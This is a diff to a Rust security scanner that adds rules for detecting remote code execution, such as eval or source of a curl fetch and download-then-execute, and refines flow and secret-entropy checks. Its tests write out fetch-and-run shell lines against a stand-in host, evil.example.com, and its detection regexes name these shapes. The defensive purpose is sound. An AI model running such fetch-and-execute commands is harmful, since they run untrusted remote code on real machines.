@@ -1,4 +1,5 @@
 use std::collections::HashMap;
+use std::collections::HashSet;
 use std::sync::OnceLock;
 
 use regex::Regex;
@@ -612,6 +613,36 @@ pub(crate) static SENSITIVE_PATTERNS: &[SensitivePattern] = &[
         redact_match: true,
         doc_severity: None,
     },
+    // VTD-0020 — eval of command-substituted fetch (eval "$(curl ...)")
+    SensitivePattern {
+        rule_id: RULE_RCE_PIPE_TO_SHELL,
+        label: "Remote code execution via pipe to shell",
+        severity: Severity::Critical,
+        intent: Intent::Malicious,
+        code_only: true,
+        redact_match: false,
+        doc_severity: None,
+    },
+    // VTD-0020 — source/dot-source of process-substituted fetch (source <(curl ...))
+    SensitivePattern {
+        rule_id: RULE_RCE_PIPE_TO_SHELL,
+        label: "Remote code execution via pipe to shell",
+        severity: Severity::Critical,
+        intent: Intent::Malicious,
+        code_only: true,
+        redact_match: false,
+        doc_severity: None,
+    },
+    // VTD-0020 — download-then-execute (curl -o f URL && bash f)
+    SensitivePattern {
+        rule_id: RULE_RCE_PIPE_TO_SHELL,
+        label: "Remote code execution via pipe to shell",
+        severity: Severity::Critical,
+        intent: Intent::Malicious,
+        code_only: true,
+        redact_match: false,
+        doc_severity: None,
+    },
 ];
 
 // Regex strings indexed parallel to SENSITIVE_PATTERNS (same order, same count).
@@ -744,9 +775,25 @@ static SENSITIVE_PATTERN_STRS: &[&str] = &[
     r#"(?i)(?:Content-Type|content[_-]?type)["']?\s*[:=]\s*["']?application/octet-stream"#,
     // VTD-0027 — shell variable assigned long base64 literal
     r#"\b[A-Za-z_]\w*=["'][A-Za-z0-9+/]{40,}={0,2}["']"#,
+    // VTD-0020 — eval of command-substituted fetch (eval "$(curl ...)")
+    r#"(?i)\beval\s+["']?\$\(\s*(?:curl|wget)\s"#,
+    // VTD-0020 — source/dot-source of process-substituted fetch (source <(curl ...))
+    r#"(?i)(?:\bsource\s+|\B\.\s+)<\(\s*(?:curl|wget)\s"#,
+    // VTD-0020 — download-then-execute: only the download half is here;
+    // `executes_downloaded_file` decides whether the downloaded file runs.
+    DOWNLOAD_THEN_EXEC_STR,
 ];
 
 static SENSITIVE_REGEXES: OnceLock<Vec<Regex>> = OnceLock::new();
+
+// VTD-0020 — download-then-execute (curl -o f URL && bash f). The regex
+// proves a download with an output flag (`-o`, a combined short-flag cluster
+// ending in `o`/`O` like `-fsSLo f`, `--output f`, `--output=f`) and a
+// following command; whether that command executes the downloaded file is
+// `executes_downloaded_file`'s job, so a download-only line, a discarded
+// download or a different executed file cannot fire.
+const DOWNLOAD_THEN_EXEC_STR: &str =
+    r#"(?i)\b(?:curl|wget)\s[^;\n|&]*(?:--output|-[A-Za-z]*[oO])(?:\s+|=)\S+[^;\n|&]*(?:&&|;)"#;
 
 pub(crate) fn get_sensitive_regexes() -> &'static [Regex] {
     SENSITIVE_REGEXES.get_or_init(|| {
@@ -760,9 +807,22 @@ pub(crate) fn get_sensitive_regexes() -> &'static [Regex] {
 static ASSIGNMENT_QUOTED_VALUE_STR: &str =
     r#"(?:["']?([A-Za-z_][A-Za-z0-9_.:-]*)["']?\s*[:=]\s*["']([^"'\r\n]{20,})["'])"#;
 static SUSPICIOUS_SECRET_KEY_STR: &str = r"(?i)(?:^|[-_.])(?:api[-_.]?key|access[-_.]?token|auth[-_.]?token|refresh[-_.]?token|token|secret|password|passwd|pwd|private[-_.]?key|client[-_.]?secret|credential|credentials|bearer)(?:$|[-_.])";
+// Variable-reference constructs a value can be built from without holding any
+// literal of its own: shell parameter expansions (`$VAR`, `${VAR}`,
+// `${VAR:-}`, `${VAR:-$OTHER}`), container/IDE interpolations
+// (`${localEnv:VAR}`), command substitutions (`$(...)`), and
+// mustache/handlebars template slots (`{{VAR}}`).
+//
+// Round 3 review: only reference-only shapes are stripped. `${VAR:-<literal>}`
+// supplies a literal default when the variable is unset, so it leaves the
+// literal behind and keeps the value checkable.
+static VARIABLE_REFERENCE_STR: &str = r#"\$\{[A-Za-z_][A-Za-z0-9_]*\}|\$\{[A-Za-z_][A-Za-z0-9_]*:-\}|\$\{[A-Za-z_][A-Za-z0-9_]*:-\$[A-Za-z_][A-Za-z0-9_]*\}|\$\{localEnv:[A-Za-z_][A-Za-z0-9_]*:?\}|\$[A-Za-z_][A-Za-z0-9_]*|\{\{[^{}]*\}\}|\$\([^)]*\)"#;
 
 static ASSIGNMENT_QUOTED_VALUE_RE: OnceLock<Regex> = OnceLock::new();
 static SUSPICIOUS_SECRET_KEY_RE: OnceLock<Regex> = OnceLock::new();
+static VARIABLE_REFERENCE_RE: OnceLock<Regex> = OnceLock::new();
+static CMD_SUBST_RE: OnceLock<Regex> = OnceLock::new();
+static SUBST_LITERAL_RE: OnceLock<Regex> = OnceLock::new();
 
 /// caps `s` to at most `max_chars` UTF-8 characters, cutting on a character boundary.
 fn truncate_chars(s: &str, max_chars: usize) -> &str {
@@ -833,6 +893,94 @@ fn keep_best(
 /// # Returns
 /// A [`SensitiveScan`]; `secrets_check_failed` is `true` if any critical or
 /// high-severity finding was produced.
+/// Index of the download-then-execute pattern in `SENSITIVE_PATTERN_STRS`.
+fn download_then_exec_index() -> usize {
+    static IDX: OnceLock<usize> = OnceLock::new();
+    *IDX.get_or_init(|| {
+        SENSITIVE_PATTERN_STRS
+            .iter()
+            .position(|s| *s == DOWNLOAD_THEN_EXEC_STR)
+            .expect("download-then-exec pattern present in SENSITIVE_PATTERN_STRS")
+    })
+}
+
+/// The path the `curl`/`wget` in `segment` writes with its output flag:
+/// `-o f`, a combined short-flag cluster ending in `o`/`O` (`-fsSLo f`),
+/// `--output f` or `--output=f`. `None` when the flag's operand is the URL
+/// (a bare `curl -O URL`) or the segment has no output flag.
+fn downloaded_path(segment: &str) -> Option<&str> {
+    if !segment.contains("curl") && !segment.contains("wget") {
+        return None;
+    }
+    let tokens: Vec<&str> = segment.split_whitespace().collect();
+    for (i, token) in tokens.iter().enumerate() {
+        let operand = if *token == "--output" || *token == "-o" {
+            tokens.get(i + 1).copied()
+        } else if let Some(rest) = token.strip_prefix("--output=") {
+            Some(rest)
+        } else if token.len() > 1
+            && token.starts_with('-')
+            && !token.starts_with("--")
+            && token[1..].chars().all(|c| c.is_ascii_alphabetic())
+            && matches!(token.chars().last(), Some('o' | 'O'))
+        {
+            tokens.get(i + 1).copied()
+        } else {
+            continue;
+        };
+        let operand = operand?;
+        if operand.starts_with("http://") || operand.starts_with("https://") {
+            return None;
+        }
+        return Some(operand.trim_matches('"').trim_matches('\''));
+    }
+    None
+}
+
+/// True when a later command segment of `line` executes the file the
+/// download writes: an interpreter invocation (`sudo bash f`, `python f`,
+/// `node f`) or `./f`, with quotes and a leading `./` ignored. `/dev/null`
+/// and a different file never count — the rule fires only when the bytes
+/// that were downloaded are the bytes that run.
+fn executes_downloaded_file(line: &str) -> bool {
+    let segments: Vec<&str> = line.split("&&").flat_map(|s| s.split(';')).collect();
+    let Some((download_idx, path)) = segments
+        .iter()
+        .enumerate()
+        .find_map(|(i, segment)| downloaded_path(segment).map(|p| (i, p)))
+    else {
+        return false;
+    };
+    if path == "/dev/null" {
+        return false;
+    }
+    segments.iter().skip(download_idx + 1).any(|segment| {
+        let tokens: Vec<&str> = segment.split_whitespace().collect();
+        for (i, token) in tokens.iter().enumerate() {
+            let token = token.trim_matches('"').trim_matches('\'');
+            // `./f` — direct execution of the downloaded file.
+            if token.strip_prefix("./").is_some_and(|c| c == path) {
+                return true;
+            }
+            // `sudo bash f`, `python f` — an interpreter running the file.
+            if matches!(
+                token.to_ascii_lowercase().as_str(),
+                "bash" | "sh" | "zsh" | "dash" | "ksh" | "python" | "python3" | "node"
+            ) {
+                for candidate in tokens.iter().skip(i + 1) {
+                    let candidate = candidate.trim_matches('"').trim_matches('\'');
+                    if candidate.starts_with('-') {
+                        continue; // an interpreter flag, not the file
+                    }
+                    let candidate = candidate.strip_prefix("./").unwrap_or(candidate);
+                    return candidate == path;
+                }
+            }
+        }
+        false
+    })
+}
+
 pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> SensitiveScan {
     let mut scan = SensitiveScan {
         findings: Vec::new(),
@@ -853,6 +1001,10 @@ pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> S
             .map(|line| expand_line(line, &bindings))
             .collect();
         let mut best_by_rule: HashMap<&'static str, usize> = HashMap::new();
+        // Flow facts for the fetch/decode gates, built lazily once per file:
+        // the gate must cost a fixed number of passes over the file, not one
+        // whole-file rescan per occurrence.
+        let mut flow_facts: Option<FlowFacts> = None;
 
         for (i_pat, pat) in SENSITIVE_PATTERNS.iter().enumerate() {
             if pat.code_only && is_doc {
@@ -866,6 +1018,10 @@ pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> S
                 pat.severity.clone()
             };
             let re = &regexes[i_pat];
+            // The download-then-execute pattern proves only a download with
+            // a following command; the line is a finding only when that
+            // command executes the downloaded file.
+            let download_exec = i_pat == download_then_exec_index();
             let mut best: Option<(Severity, usize, usize, bool)> = None;
             // C25: the fetch and decode rules are flow-sensitive, and the
             // assessment must happen per occurrence *before* the best is
@@ -877,6 +1033,9 @@ pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> S
             );
 
             for (i_line, line) in lines.iter().enumerate() {
+                if download_exec && !executes_downloaded_file(line) {
+                    continue;
+                }
                 // Keep the strongest match on the line; a lower-severity
                 // pattern for the same rule must not hide a later match.
                 let mut direct_found = false;
@@ -884,15 +1043,18 @@ pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> S
                     direct_found = true;
                     if flow_sensitive {
                         let var = assigned_var(line, found.start());
-                        // Unknown flow fails closed: the finding is kept
-                        // unless the value reaches a positively recognized
-                        // harmless consumer (json/yaml/csv parsing, printing,
-                        // or a plain string decode).
-                        let executed = var.as_deref().is_some_and(|v| reaches_sink(content, v));
-                        let harmless = !executed
-                            && var
-                                .as_deref()
-                                .is_some_and(|v| reaches_harmless_consumer(content, v));
+                        // Unknown flow fails closed: the occurrence is kept
+                        // unless *every* use of the variable is a positively
+                        // recognized harmless consumer (json/yaml/csv
+                        // parsing or printing). One unrecognized use — an
+                        // alias, a helper call, a sink — keeps full severity.
+                        let facts = flow_facts.get_or_insert_with(|| FlowFacts::build(content));
+                        let harmless = var.as_deref().is_some_and(|v| {
+                            facts.all_uses_harmless(
+                                v,
+                                pat.rule_id == RULE_PYTHON_BASE64_DECODE_VARIABLE,
+                            )
+                        });
                         match pat.rule_id {
                             RULE_PYTHON_REMOTE_FETCH if harmless => {}
                             RULE_PYTHON_BASE64_DECODE_VARIABLE => {
@@ -981,32 +1143,157 @@ pub(crate) fn scan_sensitive_patterns(text_files: &HashMap<String, String>) -> S
     scan
 }
 
-/// True when `var`'s value can reach a code-execution sink anywhere in
-/// `content`: eval/exec on it, a subprocess or os.system call carrying it, or
-/// an import of it. Line-level approximation: a same-file flow check, not a
-/// taint analysis — an unknown flow never suppresses a finding, it only
-/// fails to raise one beyond its base severity.
-fn reaches_sink(content: &str, var: &str) -> bool {
-    // Per-variable pattern: a OnceLock would pin the first variable seen.
-    let re = Regex::new(&format!(
-        r#"(?i)(?:eval|exec)\s*\([^)]*\b{var}\b|__import__\s*\(\s*{var}\b|import\s+{var}\b|importlib\.import_module\s*\(\s*{var}\b|subprocess\.\w+\s*\([^)]*\b{var}\b|os\.(?:system|popen)\s*\([^)]*\b{var}\b"#
-    ))
-    .expect("bad sink re");
-    re.is_match(content)
+/// Flow facts for one file's fetch/decode gating, computed in a fixed number
+/// of linear passes over the file instead of rescanning the whole file for
+/// every occurrence (which made the cost occurrences × file size). Built
+/// lazily, once per file, at the first flow-sensitive occurrence.
+struct FlowFacts {
+    /// Variables whose value reaches a code-execution sink anywhere in the
+    /// file: eval/exec arguments, a subprocess or os.system call carrying
+    /// them, `__import__`/`importlib.import_module` of them, or an import.
+    /// Line-level approximation: a same-file flow check, not a taint
+    /// analysis — an unknown flow never suppresses a finding, it only fails
+    /// to raise one beyond its base severity.
+    sink_vars: HashSet<String>,
+    /// Non-assignment occurrences of each variable — a "use". A use that is
+    /// not positively recognized as harmless keeps the finding, so unknown
+    /// flows (aliases, helper calls, cross-file) fail closed.
+    uses: HashMap<String, usize>,
+    /// Uses covered by a recognized harmless consumer call or `.json(`
+    /// parse: JSON/YAML parsing, CSV reading, printing.
+    consumer_uses: HashMap<String, usize>,
+    /// Uses as `var.decode(...)` — a plain bytes→str decode. Not harmless
+    /// for fetched content: decoding is the normal step before `exec`, so
+    /// it only ever proves harmlessness for the base64-decode rule.
+    decode_uses: HashMap<String, usize>,
 }
 
-/// True when `var`'s value reaches a positively recognized harmless consumer:
-/// JSON/YAML parsing, CSV reading, printing, or a plain string decode. This
-/// is the only recognized proof that a fetched or decoded value is not
-/// executed — absence of a sink is NOT proof, so unknown flows keep the
-/// finding at full severity (aliases, helper calls and cross-file flows are
-/// unknown by construction of this same-file check).
-fn reaches_harmless_consumer(content: &str, var: &str) -> bool {
-    let re = Regex::new(&format!(
-        r#"(?i)(?:json\.loads|yaml\.safe_load|csv\.reader|csv\.dictreader|print)\s*\([^)]*\b{var}\b|\b{var}\s*\.\s*(?:decode|json)\s*\("#
-    ))
-    .expect("bad harmless re");
-    re.is_match(content)
+impl FlowFacts {
+    fn build(content: &str) -> Self {
+        static SINK_RE: OnceLock<Regex> = OnceLock::new();
+        static CONSUMER_RE: OnceLock<Regex> = OnceLock::new();
+        static DECODE_JSON_RE: OnceLock<Regex> = OnceLock::new();
+        static ASSIGN_LHS_RE: OnceLock<Regex> = OnceLock::new();
+        static WORD_RE: OnceLock<Regex> = OnceLock::new();
+        let sink_re = SINK_RE.get_or_init(|| {
+            // One capture per alternative: the sink's arguments (tokenized
+            // below) or the imported/looked-up name. Only argument tokens
+            // are marked, so a method named like a variable (`run`) is not.
+            Regex::new(
+                r"(?i)(?:eval|exec)\s*\(([^)]*)|__import__\s*\(\s*(\w+)|import\s+(\w+)|importlib\.import_module\s*\(\s*(\w+)|subprocess\.\w+\s*\(([^)]*)|os\.(?:system|popen)\s*\(([^)]*)",
+            )
+            .expect("bad sink re")
+        });
+        let consumer_re = CONSUMER_RE.get_or_init(|| {
+            // Left boundary on every consumer (`fingerprint(`, `myjson.loads(`
+            // must not match); `print` also excludes a leading `.` (an
+            // `obj.print(` method is not the builtin). Arguments stop at the
+            // line end: an unclosed `print(` must not reach a later line.
+            Regex::new(
+                r"(?i)(?:\b(?:json\.loads|yaml\.safe_load|csv\.reader|csv\.dictreader)|(?:^|[^.\w])print)\s*\(([^)\n]*)",
+            )
+            .expect("bad harmless re")
+        });
+        let decode_json_re = DECODE_JSON_RE.get_or_init(|| {
+            Regex::new(r"(?i)\b(\w+)\s*\.\s*(decode|json)\s*\(").expect("bad decode re")
+        });
+        let assign_lhs_re = ASSIGN_LHS_RE.get_or_init(|| {
+            // The regex crate has no look-ahead, so `==` is filtered after
+            // the match (a second `=` right after the matched one).
+            Regex::new(r"([A-Za-z_]\w*)\s*=").expect("bad assignment re")
+        });
+        let word_re = WORD_RE.get_or_init(|| Regex::new(r"\w+").expect("bad word re"));
+
+        let mut facts = FlowFacts {
+            sink_vars: HashSet::new(),
+            uses: HashMap::new(),
+            consumer_uses: HashMap::new(),
+            decode_uses: HashMap::new(),
+        };
+
+        // Sinks: mark every word inside sink arguments, plus imported names.
+        for caps in sink_re.captures_iter(content) {
+            for group in [1, 2, 3, 4, 5, 6] {
+                if let Some(args) = caps.get(group) {
+                    for word in word_re.find_iter(args.as_str()) {
+                        facts.sink_vars.insert(word.as_str().to_lowercase());
+                    }
+                }
+            }
+        }
+
+        // Harmless consumers and `.decode(`/`.json(` attributes, recorded by
+        // offset: a use counts as covered only at the offset where it is
+        // actually consumed, never because the same name appears in a
+        // consumer call somewhere else in the file.
+        let mut consumer_offsets: HashSet<usize> = HashSet::new();
+        let mut decode_offsets: HashSet<usize> = HashSet::new();
+        for caps in consumer_re.captures_iter(content) {
+            let Some(args) = caps.get(1) else { continue };
+            for word in word_re.find_iter(args.as_str()) {
+                consumer_offsets.insert(args.start() + word.start());
+            }
+        }
+        for caps in decode_json_re.captures_iter(content) {
+            let var = caps.get(1).expect("capture 1 always present");
+            let which = caps.get(2).expect("capture 2 always present").as_str();
+            let offsets = if which.eq_ignore_ascii_case("decode") {
+                &mut decode_offsets
+            } else {
+                &mut consumer_offsets
+            };
+            offsets.insert(var.start());
+        }
+
+        // Uses: every word occurrence that is not the left-hand side of an
+        // assignment (`==` comparisons are not assignments). Keywords,
+        // strings and comments count as uses too — that only ever fails
+        // closed (keeps the finding).
+        let lhs_starts: HashSet<usize> = assign_lhs_re
+            .captures_iter(content)
+            .filter(|caps| content.as_bytes().get(caps.get(0).expect("match").end()) != Some(&b'='))
+            .filter_map(|caps| caps.get(1).map(|m| m.start()))
+            .collect();
+        for word in word_re.find_iter(content) {
+            if lhs_starts.contains(&word.start()) {
+                continue;
+            }
+            let var = word.as_str().to_lowercase();
+            *facts.uses.entry(var.clone()).or_insert(0) += 1;
+            // A use is covered at most once: a consumer call first, else a
+            // plain decode, so `json.loads(r.decode())` cannot double-cover.
+            if consumer_offsets.contains(&word.start()) {
+                *facts.consumer_uses.entry(var).or_insert(0) += 1;
+            } else if decode_offsets.contains(&word.start()) {
+                *facts.decode_uses.entry(var).or_insert(0) += 1;
+            }
+        }
+        facts
+    }
+
+    /// True when every use of `var` is a positively recognized harmless
+    /// consumer and at least one use exists — a single unrecognized use
+    /// (including one in a shape the matcher does not know) keeps the finding
+    /// at full severity. `count_decode` also accepts `var.decode(...)`, the
+    /// labelled plain-string shape for the base64-decode rule; it is never
+    /// harmless for fetched content, where decoding is the step before
+    /// execution.
+    fn all_uses_harmless(&self, var: &str, count_decode: bool) -> bool {
+        let var = var.to_lowercase();
+        let Some(&uses) = self.uses.get(&var) else {
+            return false;
+        };
+        if uses == 0 || self.sink_vars.contains(&var) {
+            return false;
+        }
+        let covered = self.consumer_uses.get(&var).copied().unwrap_or(0)
+            + if count_decode {
+                self.decode_uses.get(&var).copied().unwrap_or(0)
+            } else {
+                0
+            };
+        covered >= uses
+    }
 }
 
 /// The variable assigned on a `VAR = <fetch/decode>` match: the pattern
@@ -1038,10 +1325,96 @@ fn shannon_entropy(s: &str) -> f64 {
         .sum()
 }
 
+/// True when `key` names, by standing convention, *where* a credential lives
+/// or *which* public identifier to use — never the credential itself. A key
+/// ending in `_file` follows the docker-secrets `*_FILE` convention (e.g.
+/// `POSTGRES_PASSWORD_FILE`, `BRAINSTORM_TOKEN_FILE`): the value is the path
+/// the credential is read from at runtime. A key ending in `_program_id`
+/// names a public on-chain program identifier (Solana's `*_PROGRAM_ID`
+/// constants are public addresses by construction). Neither convention has a
+/// form in which the value is the secret, so skipping them cannot hide a
+/// hardcoded credential; every other key shape fails closed.
+///
+/// Round 3 review: the `*_FILE` skip is gated on the value being
+/// path-shaped or a reference — the docker-secrets convention is "the value
+/// is a path". A secret-shaped value under a `_FILE` key fails closed.
+fn is_conventional_non_secret_key(key: &str, value: &str) -> bool {
+    let key = key.to_ascii_lowercase();
+    if key.ends_with("_file") {
+        return value.contains('/') || value.contains("${");
+    }
+    key.ends_with("_program_id")
+}
+
+/// True when `value` is made up entirely of variable-reference constructs,
+/// leaving no literal residue once they are stripped. Assigning `$OTHER_VAR`,
+/// `${OTHER_VAR:-}` or a `$(...)` that only reads runtime state into a
+/// secret-named variable copies runtime state; nothing is hardcoded. A value
+/// that mixes references with literal text keeps a residue and fails closed:
+/// it is evaluated exactly as before, reference bytes still counted toward
+/// its entropy.
+///
+/// Round 3 review: a literal inside a command substitution is still a
+/// literal. `$(echo <secret-shaped run>)` is checked before the strip pass;
+/// a path-like body (`cat /run/secrets/brainstorm-token`) has no 20-char
+/// alphanumeric run and stays a reference.
+fn is_pure_variable_reference(value: &str) -> bool {
+    let subst_re =
+        CMD_SUBST_RE.get_or_init(|| Regex::new(r"\$\(([^)]*)\)").expect("bad cmd-subst regex"));
+    let literal_re = SUBST_LITERAL_RE
+        .get_or_init(|| Regex::new(r"[A-Za-z0-9]{20,}").expect("bad literal-run re"));
+    for caps in subst_re.captures_iter(value) {
+        let body = caps.get(1).map(|m| m.as_str()).unwrap_or("");
+        if literal_re
+            .find_iter(body)
+            .any(|m| shannon_entropy(m.as_str()) >= 3.5)
+        {
+            return false;
+        }
+    }
+    let re = VARIABLE_REFERENCE_RE
+        .get_or_init(|| Regex::new(VARIABLE_REFERENCE_STR).expect("bad var-ref regex"));
+    re.replace_all(value, "").trim().is_empty()
+}
+
+/// True when `value` reads as placeholder prose because every `...` in it
+/// stands alone — surrounded by spaces/brackets or at the value's edges
+/// (`[ ... 64-byte JSON array ... ]`). Round 3 review: a `...` glued to
+/// word characters is not placeholder prose; the encodings a real secret
+/// takes never contain three consecutive dots mid-token, so a trailing
+/// `xK9m...` keeps firing.
+fn is_placeholder_value(value: &str) -> bool {
+    let bytes = value.as_bytes();
+    let mut any = false;
+    for (i, _) in value.match_indices("...") {
+        any = true;
+        let before_ok = i == 0 || matches!(bytes[i - 1], b' ' | b'[' | b']');
+        let after = i + 3;
+        let after_ok = after == bytes.len() || matches!(bytes[after], b' ' | b'[' | b']');
+        if !before_ok || !after_ok {
+            return false;
+        }
+    }
+    any
+}
+
 /// scans non-markdown files for high-entropy assignment expressions that resemble hardcoded secrets.
 ///
 /// matches `key = "value"` and `key: "value"` forms where the key name contains a
 /// secret-related word (token, api_key, password, etc.) and the value has Shannon entropy ≥ 3.5.
+///
+/// three shapes that name or dereference a secret without storing it are
+/// skipped — each is provably not a hardcoded credential, so anything else
+/// fails closed and keeps firing (no context-based severity downgrades):
+/// - keys ending in `_program_id` — a public on-chain program identifier —
+///   and `*_FILE` keys whose value is path-shaped or a reference, the
+///   docker-secrets convention for *where* a credential lives: neither
+///   convention has a form in which the value is the secret;
+/// - values made up entirely of variable references (`$VAR`, `${...}`,
+///   `$(...)` bodies without a secret-shaped literal, `{{...}}` template
+///   slots) — runtime state, no literal bytes;
+/// - values whose every `...` stands alone — placeholder prose from usage
+///   documentation.
 ///
 /// # Parameters
 /// - `text_files` — map of normalized relative paths to decoded UTF-8 file content.
@@ -1066,6 +1439,15 @@ pub(crate) fn scan_entropy(text_files: &HashMap<String, String>, findings: &mut 
                     continue;
                 }
                 if !key_re.is_match(key) {
+                    continue;
+                }
+                if is_conventional_non_secret_key(key, value) {
+                    continue;
+                }
+                if is_placeholder_value(value) {
+                    continue;
+                }
+                if is_pure_variable_reference(value) {
                     continue;
                 }
                 if shannon_entropy(value) >= 3.5 {
@@ -1268,7 +1650,97 @@ mod tests {
             r#"PAYLOAD="QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==""#,
             "VTD-0027",
         ),
+        // VTD-0020 (eval of command-substituted fetch)
+        (r#"eval "$(curl http://evil.example.com/x.sh)""#, "VTD-0020"),
+        // VTD-0020 (source of process-substituted fetch)
+        (r#"source <(curl http://evil.example.com/x.sh)"#, "VTD-0020"),
+        // VTD-0020 (dot-source of process-substituted fetch)
+        (". <(curl http://evil.example.com/x.sh)", "VTD-0020"),
+        // VTD-0020 (curl download-then-execute)
+        (
+            "curl -o /tmp/x.sh http://evil.example.com/x.sh && bash /tmp/x.sh",
+            "VTD-0020",
+        ),
+        // VTD-0020 (wget download-then-execute)
+        (
+            "wget -O /tmp/x.sh http://evil.example.com/x.sh; sh /tmp/x.sh",
+            "VTD-0020",
+        ),
     ];
+
+    // Near-miss shapes for the literal remote-execution patterns: fetches that
+    // never reach an interpreter must not fire the pipe-to-shell rule.
+    #[test]
+    fn literal_remote_exec_near_misses_do_not_fire() {
+        let near_misses: &[&str] = &[
+            // download with no later execution
+            "curl -o /tmp/data.txt http://x.example.com/data.txt",
+            // eval of a non-fetched string
+            r#"eval "echo hi""#,
+            // source of a local file, not a fetch
+            "source ./config.sh",
+            // eval of a shell variable is VTD-0023's job, not pipe-to-shell
+            r#"eval "$PAYLOAD""#,
+        ];
+        for &content in near_misses {
+            let tf = files(&[("scripts/x.sh", content)]);
+            let findings = scan_sensitive_patterns(&tf).findings;
+            assert!(
+                !findings.iter().any(|f| f.rule_id == RULE_RCE_PIPE_TO_SHELL),
+                "pipe-to-shell fired on near-miss: {content:?}"
+            );
+        }
+    }
+
+    // Round 3 review: the download-then-execute shape fires only when the
+    // executed file is the downloaded one.
+    #[test]
+    fn download_to_dev_null_then_local_script_does_not_fire() {
+        // A health-check download to /dev/null discards the bytes; the
+        // script that runs is a local file, not the download.
+        let content = "curl -s -o /dev/null http://localhost:3000/health && bash scripts/start.sh";
+        let tf = files(&[("scripts/x.sh", content)]);
+        let findings = scan_sensitive_patterns(&tf).findings;
+        assert!(
+            !findings.iter().any(|f| f.rule_id == RULE_RCE_PIPE_TO_SHELL),
+            "a discarded download is not execution: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn download_then_exec_covers_combined_flags_and_interpreters() {
+        // Combined short flags (`-fsSLo f`), intervening commands
+        // (`chmod +x f`), and `python`/`node` execution all fire like the
+        // pipe pattern.
+        let contents = [
+            "curl -fsSLo install.sh http://evil.example.com/x.sh && bash install.sh",
+            "curl -o i.sh http://evil.example.com/x.sh && chmod +x i.sh && ./i.sh",
+            "curl -o f.py http://evil.example.com/x.py && python f.py",
+            "curl -o f.js http://evil.example.com/x.js && node f.js",
+            "wget --output=setup.sh http://evil.example.com/x.sh && sudo bash setup.sh",
+        ];
+        for content in contents {
+            let tf = files(&[("scripts/x.sh", content)]);
+            let findings = scan_sensitive_patterns(&tf).findings;
+            assert!(
+                findings.iter().any(|f| f.rule_id == RULE_RCE_PIPE_TO_SHELL),
+                "download-then-exec did not fire for: {content:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn download_then_exec_of_a_different_file_does_not_fire() {
+        // Executing a different file than the one downloaded is not
+        // running remote bytes: the rule must not fire.
+        let content = "curl -o a.sh http://evil.example.com/x.sh && bash b.sh";
+        let tf = files(&[("scripts/x.sh", content)]);
+        let findings = scan_sensitive_patterns(&tf).findings;
+        assert!(
+            !findings.iter().any(|f| f.rule_id == RULE_RCE_PIPE_TO_SHELL),
+            "a different executed file must not fire: {findings:?}"
+        );
+    }
 
     #[test]
     fn every_sensitive_pattern_rule_fires() {
@@ -1491,6 +1963,197 @@ mod tests {
         assert!(findings.is_empty(), "scan_entropy must not flag .md files");
     }
 
+    // ── Labelled false-positive shapes (VTD-0003) ───────────────────────────
+    //
+    // Every wrong shape from the labelling run sits in the same file as a
+    // real hardcoded secret (and, where a carve is anchored to a key suffix,
+    // a secret under a near-miss key). The shape lines all pass the length,
+    // key-name and entropy gates on their own, so each test fails if its
+    // carve regresses (extra findings) or is loosened too far (missing ones).
+
+    // Shape: a secret-named variable that only copies another variable, a
+    // parameter expansion, a command substitution, a container/IDE
+    // interpolation, or a mustache template slot — runtime state, not a
+    // stored literal.
+    #[test]
+    fn scan_entropy_skips_pure_variable_reference_values() {
+        let content = r#"API_TOKEN="$CLOUDFLARE_API_TOKEN"
+token="${CLOUDFLARE_API_TOKEN:-}"
+oauth_token="${localEnv:CLAUDE_CODE_OAUTH_TOKEN:}"
+bearer="$(cat /run/secrets/brainstorm-token)"
+password_hash="{{ADMIN_PASSWORD_HASH}}"
+api_key = "xK9mP2qRzT8wLvN3sY6cB1jH4dF7gA0eUiOhWkMnS5tX" // gitleaks:allow
+"#;
+        let tf = files(&[("scripts/env.sh", content)]);
+        let mut findings = Vec::new();
+        scan_entropy(&tf, &mut findings);
+        assert_eq!(
+            findings.len(),
+            1,
+            "only the real secret may fire: {findings:?}"
+        );
+        assert!(
+            findings[0].detail.contains("api_key = [REDACTED]"),
+            "the finding must be for the real secret: {}",
+            findings[0].detail
+        );
+    }
+
+    // A variable reference glued to real literal bytes keeps a literal
+    // residue, so it must not be treated as a pure copy — mixed values fail
+    // closed and keep today's behavior.
+    #[test]
+    fn scan_entropy_still_fires_on_mixed_variable_and_literal_value() {
+        let content = "api_key = \"${PREFIX}xK9mP2qRzT8wLvN3sY6cB1jH4dF7gA0e\"";
+        let tf = files(&[("scripts/env.sh", content)]);
+        let mut findings = Vec::new();
+        scan_entropy(&tf, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_HIGH_ENTROPY_SECRET),
+            "a literal residue next to a variable reference must still fire"
+        );
+    }
+
+    // Shape: a `*_FILE` key holds *where* the credential lives (docker-secrets
+    // convention), not the credential. `FILE_TOKEN` guards the suffix anchor:
+    // a key that merely contains `file` still fires.
+    #[test]
+    fn scan_entropy_skips_credential_file_path_keys() {
+        let content = r#"export BRAINSTORM_TOKEN_FILE="${PROJECT_DIR}/.superpowers/brainstorm/.last-token"
+FILE_TOKEN = "xK9mP2qRzT8wLvN3sY6cB1jH4dF7gA0eUiOhWkMnS5tX" // gitleaks:allow
+"#;
+        let tf = files(&[("scripts/start-server.sh", content)]);
+        let mut findings = Vec::new();
+        scan_entropy(&tf, &mut findings);
+        assert_eq!(
+            findings.len(),
+            1,
+            "only the non-_FILE key may fire: {findings:?}"
+        );
+        assert!(
+            findings[0].detail.contains("FILE_TOKEN = [REDACTED]"),
+            "the finding must be for the real secret: {}",
+            findings[0].detail
+        );
+    }
+
+    // Shape: public on-chain program identifiers (Solana `*_PROGRAM_ID`) are
+    // public addresses by construction. `TOKEN_ID` guards the suffix anchor:
+    // a key ending in plain `_id` still fires.
+    #[test]
+    fn scan_entropy_skips_public_program_id_constants() {
